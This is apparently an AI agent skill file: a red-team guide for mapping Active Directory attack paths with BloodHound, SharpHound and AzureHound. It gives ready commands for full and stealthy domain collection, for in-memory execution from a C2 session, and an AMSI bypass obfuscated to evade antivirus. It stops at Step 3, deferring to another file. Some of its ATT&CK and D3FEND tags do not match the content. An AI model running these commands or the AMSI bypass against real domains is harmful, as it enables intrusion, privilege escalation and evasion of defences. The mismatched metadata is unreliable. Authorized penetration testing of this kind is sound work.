---
name: performing-active-directory-bloodhound-analysis
description: "Use BloodHound and SharpHound or AzureHound to enumerate Active Directory. Signals: ad attack, domain penetration, domain controller."
zh-signals: "Use BloodHound and SharpHound (or AzureHound) to enumerate Active Directory 信号:ad攻击,域渗透,域控。"
when-to-use: Use BloodHound and SharpHound (or AzureHound) to enumerate Active Directory
  relationships and graph attack paths from a compromised user to Domain Admin. Use
  when performing AD red-team reconnaissance, mapping privilege-escalation chains
  from group memberships, ACLs, and trusts, or auditing AD for exploitable misconfigurations.
domain: cybersecurity
subdomain: red-teaming
tags:
- bloodhound
- active-directory
- sharphound
- attack-path
- ad-enumeration
- graph-theory
- privilege-escalation
version: '1.0'
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Restore Access
- Password Authentication
- Biometric Authentication
- Strong Password Policy
- Restore User Account Access
nist_csf:
- ID.RA-01
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1068
---

# Performing Active Directory BloodHound Analysis

## Overview

BloodHound is an open-source Active Directory reconnaissance tool that uses graph theory to reveal hidden relationships, attack paths, and privilege escalation opportunities within AD environments. By collecting data with SharpHound (or AzureHound for Azure AD), BloodHound visualizes how an attacker can escalate from a low-privilege user to Domain Admin through chains of misconfigurations, group memberships, ACL abuses, and trust relationships. MITRE ATT&CK classifies BloodHound as software S0521.


## When to Use

- When conducting security assessments that involve performing active directory bloodhound analysis
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Initial foothold on a domain-joined Windows system (or valid domain credentials)
- BloodHound CE (Community Edition) or BloodHound Legacy 4.x installed
- SharpHound collector (C# binary or PowerShell module)
- Neo4j database (Legacy) or PostgreSQL (CE)
- Network access to domain controllers (LDAP TCP/389, LDAPS TCP/636)


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1087.002 | Account Discovery: Domain Account | Discovery |
| T1069.002 | Permission Groups Discovery: Domain Groups | Discovery |
| T1018 | Remote System Discovery | Discovery |
| T1482 | Domain Trust Discovery | Discovery |
| T1615 | Group Policy Discovery | Discovery |
| T1069.001 | Permission Groups Discovery: Local Groups | Discovery |

## Step 1: Data Collection with SharpHound

### SharpHound.exe (Preferred for OPSEC)

```powershell
# Collect all data types (Users, Groups, Computers, Sessions, ACLs, Trusts, GPOs)
.\SharpHound.exe -c All --outputdirectory C:\Temp --zipfilename bloodhound_data.zip

# Stealth mode - collect only structure data (no session enumeration)
.\SharpHound.exe -c DCOnly --outputdirectory C:\Temp

# Collect with specific domain and credentials
.\SharpHound.exe -c All -d corp.local --ldapusername svc_enum --ldappassword Password123

# Loop collection - collect sessions over time for better coverage
.\SharpHound.exe -c Session --loop --loopduration 02:00:00 --loopinterval 00:05:00

# Collect from Havoc C2 Demon session (in-memory)
dotnet inline-execute /tools/SharpHound.exe -c All --memcache --outputdirectory C:\Temp
```

### Invoke-BloodHound (PowerShell)

```powershell
# Import and run
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp -ZipFileName bh.zip

# AMSI bypass before loading (if needed) — strings split to avoid AV signature matching
$t = 'System.Management.Automation.Am' + 'siUtils'
[Ref].Assembly.GetType($t).GetField(('am' + 'siInitFailed'),'NonPublic,Static').SetValue($null,$true)
```

### AzureHound (Azure AD)

```bash
# Collect Azure AD data
azurehound list -t <tenant-id> --refresh-token <token> -o azure_data.json

# Or using AzureHound PowerShell
Import-Module .\AzureHound.ps1
Invoke-AzureHound
```

## Step 2: Import Data into BloodHound

### BloodHound CE (v5+)

```bash
# Start BloodHound CE with Docker
curl -L https://ghst.ly/getbhce | docker compose -f - up

# Access web interface at https://localhost:8080
# Default credentials: admin / bloodhound
# Upload ZIP file via GUI: Upload Data > Select File
```

### BloodHound Legacy

```bash
# Start Neo4j
sudo neo4j start
# Access Neo4j at http://localhost:7474 (default neo4j:neo4j)

# Start BloodHound GUI
./BloodHound --no-sandbox

# Drag and drop ZIP file into BloodHound GUI
```

## Step 3: Attack Path Analysis

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
